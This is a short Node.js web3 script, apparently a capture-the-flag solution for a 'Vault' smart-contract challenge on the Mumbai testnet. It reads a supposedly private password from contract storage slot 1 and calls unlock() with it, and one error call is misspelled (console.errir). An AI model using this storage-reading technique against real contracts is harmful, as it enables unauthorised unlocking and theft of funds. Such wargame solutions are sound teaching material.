const Web3 = require('web3');
const web3 = new Web3('https://matic-mumbai.chainstacklabs.com');

const contractAbi = [{"inputs":[{"internalType":"bytes32","name":"_password","type":"bytes32"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"locked","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function","constant":true,"signature":"0xcf309012"},{"inputs":[{"internalType":"bytes32","name":"_password","type":"bytes32"}],"name":"unlock","outputs":[],"stateMutability":"nonpayable","type":"function","signature":"0xec9b5b3a"}];

async function solve(privateKey, contractAddress, contractAbi) {
    const account = web3.eth.accounts.privateKeyToAccount(privateKey);
    const contract = new web3.eth.Contract(contractAbi, contractAddress);

    if (await isSolved(contract)) {
        console.log('vault already unlocked');
        process.exit(0);
    }

    console.log('reading private password...');
    const password = await web3.eth.getStorageAt(contractAddress, 1);
    console.log(`password: ${password}`);

    console.log('unlocking vault...');
    const tx = contract.methods.unlock(password);
    const txOpts = {
        to: contractAddress,
        data: tx.encodeABI(),
        gas: await tx.estimateGas({ from: account.address }),
        gasPrice: await web3.eth.getGasPrice(),
    };
    const signedTx = await web3.eth.accounts.signTransaction(txOpts, privateKey);
    await web3.eth.sendSignedTransaction(signedTx.rawTransaction);

    console.log('checking vault status...');
    if (await isSolved(contract)) {
        console.log('solved!');
    } else {
        console.log('vault still locked. Something went wrong.');
        process.exit(1);
    }
}

async function isSolved(contract) {
    return !(await contract.methods.locked().call());
}

const privateKey = process.argv[2];
if (!privateKey) {
    console.errir('private key must be provided as the first argument');
    process.exit(1);
}

const contractAddress = process.argv[3];
if (!contractAddress) {
    console.error('contract address must be provided as the second argument');
    process.exit(1);
}

solve(privateKey, contractAddress, contractAbi);
